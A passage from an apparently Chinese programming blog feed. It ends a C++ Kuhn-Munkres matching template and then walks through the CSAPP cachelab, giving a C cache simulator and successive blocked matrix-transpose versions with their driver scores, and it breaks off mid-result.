class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// find a perfect matching with maximum total cost</span></span><br><span class="line"><span class="comment">// in bipartite graph G=(X,Y;E).</span></span><br><span class="line"><span class="comment">// if you want the total cost minimum, just negative</span></span><br><span class="line"><span class="comment">// cost.</span></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">KuhnMunkres</span> &#123;</span></span><br><span class="line"><span class="keyword">int</span> n, m, vis[N], pre[N], mth[N];</span><br><span class="line">T INF, Lx[N], Ly[N], slack[N], w[N][N];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">(<span class="keyword">int</span> _n, <span class="keyword">int</span> _m, T _INF)</span> </span>&#123;</span><br><span class="line">n = _n, m = _m, INF = _INF;</span><br><span class="line"><span class="comment">// modify weight of non-edge if need</span></span><br><span class="line">rep(i, <span class="number">0</span>, n) rep(j, <span class="number">0</span>, m) w[i][j] = -INF;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">addEdge</span><span class="params">(<span class="keyword">int</span> u, <span class="keyword">int</span> v, <span class="keyword">int</span> wgh)</span> </span>&#123;</span><br><span class="line">w[u][v] = wgh;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">find</span><span class="params">(<span class="keyword">int</span> v)</span> </span>&#123;</span><br><span class="line">rep(i, <span class="number">0</span>, m + <span class="number">1</span>) vis[i] = <span class="number">0</span>, slack[i] = INF;</span><br><span class="line"><span class="keyword">int</span> u = m;</span><br><span class="line"><span class="keyword">for</span> (mth[u] = v; mth[u] != <span class="number">-1</span>; u = v) &#123;</span><br><span class="line">vis[u] = <span class="number">1</span>;</span><br><span class="line">T d = INF;</span><br><span class="line">rep(i, <span class="number">0</span>, m) <span class="keyword">if</span> (!vis[i]) &#123;</span><br><span class="line">T att = Lx[mth[u]] + Ly[i] - w[mth[u]][i];</span><br><span class="line"><span class="comment">// maintain feasible solution</span></span><br><span class="line"><span class="keyword">if</span> (att &lt; slack[i]) slack[i] = att, pre[i] = u;</span><br><span class="line"><span class="comment">// find minimum d</span></span><br><span class="line"><span class="keyword">if</span> (slack[i] &lt; d) d = slack[v = i];</span><br><span class="line">&#125;</span><br><span class="line">rep(i, <span class="number">0</span>, m + <span class="number">1</span>)</span><br><span class="line"><span class="keyword">if</span> (vis[i]) Lx[mth[i]] -= d, Ly[i] += d;</span><br><span class="line"><span class="keyword">else</span> slack[i] -= d;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// find a augmented path</span></span><br><span class="line"><span class="keyword">for</span>(; u != m; u = pre[u]) mth[u] = mth[pre[u]];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">T <span class="title">solve</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">bool</span> iswap = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">if</span> (n &gt; m) &#123;</span><br><span class="line">rep(i, <span class="number">0</span>, n) rep(j, <span class="number">0</span>, min(i, m))</span><br><span class="line">swap(w[i][j], w[j][i]);</span><br><span class="line">iswap = <span class="literal">true</span>, swap(n, m);</span><br><span class="line">&#125;</span><br><span class="line">fill(Lx, Lx + n, <span class="number">0</span>);</span><br><span class="line">fill(Ly, Ly + m, <span class="number">0</span>);</span><br><span class="line">fill(mth, mth + m, <span class="number">-1</span>);</span><br><span class="line">rep(i, <span class="number">0</span>, n) find(i);</span><br><span class="line"></span><br><span class="line">T ret = <span class="number">0</span>;</span><br><span class="line">rep(i, <span class="number">0</span>, n) ret += Lx[i];</span><br><span class="line">rep(i, <span class="number">0</span>, m) ret += Ly[i];</span><br><span class="line"><span class="keyword">if</span> (iswap)</span><br><span class="line">per(i, <span class="number">0</span>, max(n, m)) swap(Lx[i], Ly[i]);</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;ol&gt;
&lt;li&gt;&lt;p&gt;背景：带边权的二分图&lt;strong&gt;最大权值完美匹配&lt;/strong&gt;。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;顶标概念：顶点权值 $L_x, L_y$。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;可行顶标：&lt;strong&gt;所有&lt;/strong&gt;边 $e(x→y)$ 
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>CSAPP - cachelab</title>
    <link href="http://mcginn7.github.io/2020/02/23/CSAPP-cachelab/"/>
    <id>http://mcginn7.github.io/2020/02/23/CSAPP-cachelab/</id>
    <published>2020-02-23T03:32:46.000Z</published>
    <updated>2020-02-24T15:25:53.963Z</updated>
    
    <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><h3 id="Part-A-Cache-Simuator"><a href="#Part-A-Cache-Simuator" class="headerlink" title="Part A. Cache Simuator"></a>Part A. Cache Simuator</h3><h4 id="要求"><a href="#要求" class="headerlink" title="要求"></a>要求</h4><p>将 <code>valgrind</code> 存储跟踪作为输入，在 csim.c 中实现一个缓存模拟器，结果输出：命中，不命中和驱逐的数量（hit, miss, eviction）。需要支持以下参数输入：</p><ul><li>-s：用于组索引的位数。</li><li>-E：每组行数。</li><li>-b：用于块的位数。</li><li>-t：保存 valgrind 跟踪记录的文件。</li></ul><p>Valgrind 输出格式为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">I 0400d7d4,8</span><br><span class="line"> M 0421c7f0,4</span><br><span class="line"> L 04f6b868,8</span><br><span class="line"> S 7ff0005c8,8</span><br></pre></td></tr></table></figure><p>每行格式为 <code>[space]operation address,size</code>，L 表示加载数据，S 表示存储数据，M 表示修改数据（加载后存储）。指令 M 的存储必然命中，因此其结果只有两种：2 命中或 1 未命中 1 命中。</p><p>size 表示内存访问的字节数。测试数据保证内存访问不会出现跨越缓存块的边界，因此 size 在该实验中可忽略。</p><p>在该实验中只关注<strong>数据缓存</strong>，因此操作 I（表示指令加载）可忽略。</p><h4 id="做法"><a href="#做法" class="headerlink" title="做法"></a>做法</h4><p>因为只需要输出 (hit, miss, eviction) 三元组，所以实际实现过程中不必要完全复刻 cache 的过程。</p><p>对于参数 (s, E, b, t) 输入，使用 <code>getopt</code> 指令即可。</p><p>构造二维数组 cache[1 &lt;&lt; s][E] 记录（标记，有效位）。因为组索引的位数 s 必然大于 0，所以有效位和标记位可以压入一个 64 位整数中。</p><p>在要驱逐缓存行时，使用 LRU 策略，因此还需要构造二维数组 last_used_time[1 &lt;&lt; s][E] 记录每个缓存行上次使用时间。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"cachelab.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;getopt.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;limits.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BUFFER_SIZE 50</span></span><br><span class="line"><span class="keyword">char</span> buf[BUFFER_SIZE];</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> s;  <span class="comment">// Number of set index bits</span></span><br><span class="line"><span class="keyword">int</span> E;  <span class="comment">// Associativity, number of lines per set</span></span><br><span class="line"><span class="keyword">int</span> b;  <span class="comment">// Number of block bits</span></span><br><span class="line"><span class="keyword">char</span> *t;<span class="comment">// Name of the valgrind trace to replay</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> cache_size;</span><br><span class="line"><span class="keyword">long</span> <span class="keyword">long</span> *cache;       <span class="comment">// format: tag | valid</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> time_stamp;</span><br><span class="line"><span class="keyword">unsigned</span> *last_used_time;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> hit_count;</span><br><span class="line"><span class="keyword">int</span> miss_count;</span><br><span class="line"><span class="keyword">int</span> eviction_count;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">memoryAccess</span><span class="params">(<span class="keyword">long</span> <span class="keyword">long</span> addr)</span> </span>&#123;</span><br><span class="line">++time_stamp;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> set_idx = (addr &gt;&gt; b) &amp; ((<span class="number">1</span> &lt;&lt; s) - <span class="number">1</span>);</span><br><span class="line"><span class="keyword">long</span> <span class="keyword">long</span> tag = addr &gt;&gt; (b + s);</span><br><span class="line"></span><br><span class="line"><span class="keyword">long</span> <span class="keyword">long</span> *set_cache = cache + set_idx * E;</span><br><span class="line"><span class="keyword">unsigned</span> *set_used_time = last_used_time + set_idx * E;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">unsigned</span> LRU_i = <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">unsigned</span> LRU_valid;</span><br><span class="line"><span class="keyword">unsigned</span> LRU_time;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; E; ++i) &#123;</span><br><span class="line"><span class="keyword">unsigned</span> valid = set_cache[i] &amp; <span class="number">1</span>;</span><br><span class="line"><span class="keyword">long</span> <span class="keyword">long</span> tag_i = set_cache[i] &gt;&gt; <span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span> (valid &gt; <span class="number">0</span> &amp;&amp; tag == tag_i) &#123;</span><br><span class="line">++hit_count;</span><br><span class="line">set_used_time[i] = time_stamp;</span><br><span class="line"><span class="keyword">return</span> ;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (LRU_i == <span class="number">-1</span></span><br><span class="line">  || valid &lt; LRU_valid</span><br><span class="line">  || (valid == LRU_valid&amp;&amp;</span><br><span class="line">      set_used_time[i] &lt; LRU_time)) &#123;</span><br><span class="line">LRU_i = i;</span><br><span class="line">LRU_valid = valid;</span><br><span class="line">LRU_time = set_used_time[i];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">++miss_count;</span><br><span class="line">eviction_count += LRU_valid;</span><br><span class="line">set_used_time[LRU_i] = time_stamp;</span><br><span class="line">set_cache[LRU_i] = tag &lt;&lt; <span class="number">1</span> | <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line"><span class="keyword">char</span> *optString = <span class="string">"s:E:b:t:"</span>;</span><br><span class="line"><span class="keyword">int</span> opt = getopt(argc, argv, optString);</span><br><span class="line"><span class="keyword">while</span> (~opt) &#123;</span><br><span class="line"><span class="keyword">switch</span> (opt) &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">'s'</span>: s = atoi(optarg); <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">'E'</span>: E = atoi(optarg); <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">'b'</span>: b = atoi(optarg); <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">'t'</span>: t = optarg; <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">opt = getopt(argc, argv, optString);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">time_stamp = <span class="number">0</span>;</span><br><span class="line">hit_count = miss_count = eviction_count = <span class="number">0</span>;</span><br><span class="line">cache_size = E &lt;&lt; s;</span><br><span class="line">cache = (<span class="keyword">long</span> <span class="keyword">long</span> *) <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(*cache) * cache_size);</span><br><span class="line">last_used_time = (<span class="keyword">unsigned</span> *) <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(*last_used_time) * cache_size);</span><br><span class="line"><span class="built_in">memset</span>(cache, <span class="number">0</span>, <span class="keyword">sizeof</span>(*cache) * cache_size);</span><br><span class="line"></span><br><span class="line">FILE *fp = fopen(t, <span class="string">"r"</span>);</span><br><span class="line"><span class="keyword">while</span> (fgets(buf, BUFFER_SIZE, fp) != <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="keyword">int</span> len = <span class="built_in">strlen</span>(buf);</span><br><span class="line"><span class="keyword">if</span> (len &lt;= <span class="number">2</span> || buf[<span class="number">0</span>] != <span class="string">' '</span>) <span class="keyword">continue</span>;</span><br><span class="line"><span class="keyword">char</span> op = buf[<span class="number">1</span>];</span><br><span class="line"><span class="keyword">if</span> (!(op == <span class="string">'L'</span> || op == <span class="string">'S'</span> || op == <span class="string">'M'</span>))</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len; ++i)</span><br><span class="line"><span class="keyword">if</span> (buf[i] == <span class="string">','</span>) &#123;    <span class="comment">// replace ',' with '\0'</span></span><br><span class="line">buf[i] = <span class="string">'\0'</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">buf[<span class="number">1</span>] = <span class="string">'0'</span>, buf[<span class="number">2</span>] = <span class="string">'x'</span>;</span><br><span class="line"><span class="keyword">long</span> <span class="keyword">long</span> addr;</span><br><span class="line"><span class="built_in">sscanf</span>(buf + <span class="number">1</span>, <span class="string">"%llx"</span>, &amp;addr);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"op = %c, addr = %llx, "</span>, op, addr);</span><br><span class="line">memoryAccess(addr);</span><br><span class="line"><span class="keyword">if</span> (op == <span class="string">'M'</span>) ++hit_count;</span><br><span class="line">&#125;</span><br><span class="line">printSummary(hit_count, miss_count, eviction_count);</span><br><span class="line"></span><br><span class="line">fclose(fp);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Part-B-Optimizing-Matrix-Transpose"><a href="#Part-B-Optimizing-Matrix-Transpose" class="headerlink" title="Part B. Optimizing Matrix Transpose"></a>Part B. Optimizing Matrix Transpose</h3><h4 id="要求-1"><a href="#要求-1" class="headerlink" title="要求"></a>要求</h4><p>实现函数 <code>void trans(int M, int N, int A[N][M], int B[M][N])</code> 转置矩阵 A 并存储到矩阵 B 中，限制：</p><ul><li>缓存参数为：s = 5, E = 1, b = 5。</li><li>最多能够定义 12 个 int 类型的局部变量。</li><li>不允许修改矩阵 A，但能任意修改矩阵 B。</li></ul><h4 id="做法-1"><a href="#做法-1" class="headerlink" title="做法"></a>做法</h4><p>b = 5 表示每个块缓存 $2^5=32$ 字节，即每 8 个 int 元素组索引加一，每个缓存行缓存 8 个地址连续的 int 元素。</p><p>s = 5 表示高速缓存中有 $2^5 =32$ 个组，则组索引的循环节大小为 32×8 = 256，即每 256 个 int 元素组索引开始重复。</p><p>利用<strong>局部性原理</strong>，尝试 8×8 分块转置：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">transpose_submit</span><span class="params">(<span class="keyword">int</span> M, <span class="keyword">int</span> N, <span class="keyword">int</span> A[N][M], <span class="keyword">int</span> B[M][N])</span> </span>&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> min(a,b) ((a)&lt;(b)?(a):(b))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> rep(i,l,r) for(i=(l);i&lt;(r);++i)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> repd(i,l,r,d) for(i=(l);i&lt;(r);i+=(d))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> per(i,l,r) for(i=(r)-1;i&gt;=(l);--i)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> perd(i,l,r,d) for(i=(r)-1;i&gt;=(l);i-=(d))</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> x, y, i, j;</span><br><span class="line">repd(x, <span class="number">0</span>, N, <span class="number">8</span>)</span><br><span class="line">repd(y, <span class="number">0</span>, M, <span class="number">8</span>) &#123;</span><br><span class="line">rep(i, x, min(N, x + <span class="number">8</span>))</span><br><span class="line">rep(j, y, min(M, y + <span class="number">8</span>))</span><br><span class="line">B[j][i] = A[i][j];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用 <code>make &amp;&amp; ./driver.py</code> 测试：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Cache Lab summary:</span><br><span class="line">                        Points   Max pts      Misses</span><br><span class="line">Csim correctness          27.0        27</span><br><span class="line">Trans perf 32x32           6.9         8         343</span><br><span class="line">Trans perf 64x64           0.0         8        4723</span><br><span class="line">Trans perf 61x67           8.8        10        2118</span><br><span class="line">          Total points    42.7        53</span><br></pre></td></tr></table></figure><p>在 32×32 和 61×67 效果还行，但是在 64×64 上 miss 很多。</p><p>使用以下指令查看具体的内存跟踪记录：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">./<span class="built_in">test</span>-trans -N 64 -M 64</span><br><span class="line">./csim-ref -v -s 5 -E 1 -b 5 -t ./trace.f0</span><br><span class="line">...</span><br><span class="line">L 30df6c,4 miss eviction</span><br><span class="line">S 34dc78,4 miss eviction</span><br><span class="line">L 30df70,4 hit</span><br><span class="line">S 34dd78,4 miss eviction</span><br><span class="line">L 30df74,4 hit</span><br><span class="line">S 34de78,4 miss eviction</span><br><span class="line">L 30df78,4 hit</span><br><span class="line">S 34df78,4 miss eviction</span><br><span class="line">L 30df7c,4 miss eviction</span><br><span class="line">S 34e078,4 miss eviction</span><br><span class="line">L 30e060,4 miss eviction</span><br><span class="line">S 34d97c,4 miss eviction</span><br><span class="line">L 30e064,4 hit</span><br><span class="line">S 34da7c,4 miss eviction</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>可以看到，每次在加载（L）后的存储（S）指令就会 miss，并驱逐一条缓存。</p><p>当 $SetIndex(A[i][j])=SetIndex(B[i][j])$ 时，8×8 分块中的组索引分布如下：</p><img src="/2020/02/23/CSAPP-cachelab/auad.png"><p>前 4 行定义为 $A_u$ 和 $B_u$，后 4 行定义为 $A_d$ 和 $B_d$。</p><p>读取 $A[0][j]$ 时，依次存储 $B[j][0]$。注意到，组 0 每次都加载 A 后，均因为 B 也有相同的组索引 0 而被覆盖掉，从而丢失了 A 的空间局部性。</p><p>对于这种情况，可以开辟 8 个 int 的局部变量将 $A[0][j]$ 全读入，再更新 $B[j][0]$。因为循环变量已使用了 $x, y, i, j$，因此额外的 8 个 int 是限制上限。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">transpose_submit</span><span class="params">(<span class="keyword">int</span> M, <span class="keyword">int</span> N, <span class="keyword">int</span> A[N][M], <span class="keyword">int</span> B[M][N])</span> </span>&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> min(a,b) ((a)&lt;(b)?(a):(b))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> rep(i,l,r) for(i=(l);i&lt;(r);++i)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> repd(i,l,r,d) for(i=(l);i&lt;(r);i+=(d))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> per(i,l,r) for(i=(r)-1;i&gt;=(l);--i)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> perd(i,l,r,d) for(i=(r)-1;i&gt;=(l);i-=(d))</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> x, y, i, j;</span><br><span class="line"><span class="keyword">int</span> a[<span class="number">8</span>];</span><br><span class="line">repd(x, <span class="number">0</span>, N, <span class="number">8</span>)</span><br><span class="line">repd(y, <span class="number">0</span>, M, <span class="number">8</span>)</span><br><span class="line">rep(i, x, min(N, x + <span class="number">8</span>)) &#123;</span><br><span class="line">rep(j, y, min(M, y + <span class="number">8</span>)) a[j - y] = A[i][j];</span><br><span class="line">rep(j, y, min(M, y + <span class="number">8</span>)) B[j][i] = a[j - y];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用 <code>make &amp;&amp; ./driver.py</code> 测试：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Cache Lab summary:</span><br><span class="line">                        Points   Max pts      Misses</span><br><span class="line">Csim correctness          27.0        27</span><br><span class="line">Trans perf 32x32           8.0         8         289</span><br><span class="line">Trans perf 64x64           0.0         8        4613</span><br><span class="line">Trans perf 61x67          10.0        10        1999</span><br><span class="line">          Total points    45.0        53</span><br></pre></td></tr></table></figure><p>64×64 的 miss 几乎不变，而 32×32 和 61×67 已满分。</p><p>目前为止，已经充分利用了 A 的空间局部性，然而对于 B 而言在 64×64 却非如此。</p><img src="/2020/02/23/CSAPP-cachelab/auad.png"><p>在读取 $A[i][j]$ 后，先存储 $B_u(0, 8, 16, 24)$，然后存储 $B_d(0, 8, 16, 24)$，即后 4 行的缓存覆盖掉了前 4 行的缓存，从而丢失了 B 的空间局部性。</p><p>那么解决方法自然而然是先写 B 的前 4 行再写后 4 行。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">transpose_submit</span><span class="params">(<span class="keyword">int</span> M, <span class="keyword">int</span> N, <span class="keyword">int</span> A[N][M], <span class="keyword">int</span> B[M][N])</span> </span>&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> min(a,b) ((a)&lt;(b)?(a):(b))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> rep(i,l,r) for(i=(l);i&lt;(r);++i)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> repd(i,l,r,d) for(i=(l);i&lt;(r);i+=(d))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> per(i,l,r) for(i=(r)-1;i&gt;=(l);--i)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> perd(i,l,r,d) for(i=(r)-1;i&gt;=(l);i-=(d))</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> x, y, i, j;</span><br><span class="line"><span class="keyword">int</span> a[<span class="number">8</span>];</span><br><span class="line">repd(x, <span class="number">0</span>, N, <span class="number">8</span>)</span><br><span class="line">repd(y, <span class="number">0</span>, M, <span class="number">8</span>) &#123;</span><br><span class="line">rep(i, x, min(N, x + <span class="number">8</span>)) &#123;</span><br><span class="line">rep(j, y, min(M, y + <span class="number">4</span>)) a[j - y] = A[i][j];</span><br><span class="line">rep(j, y, min(M, y + <span class="number">4</span>)) B[j][i] = a[j - y];</span><br><span class="line">&#125;</span><br><span class="line">rep(i, x, min(N, x + <span class="number">8</span>)) &#123;</span><br><span class="line">rep(j, y + <span class="number">4</span>, min(M, y + <span class="number">8</span>)) a[j - y] = A[i][j];</span><br><span class="line">rep(j, y + <span class="number">4</span>, min(M, y + <span class="number">8</span>)) B[j][i] = a[j - y];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用 <code>make &amp;&amp; ./driver.py</code> 测试：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Cache Lab summary:</span><br><span class="line">                        Points   Max pts      Misses</span><br><span class="line">Csim correctness          27.0        27</span><br><span class="line">Trans perf 32x32           7.4         8         321</span><br><span class="line">Trans perf 64x64           4.0         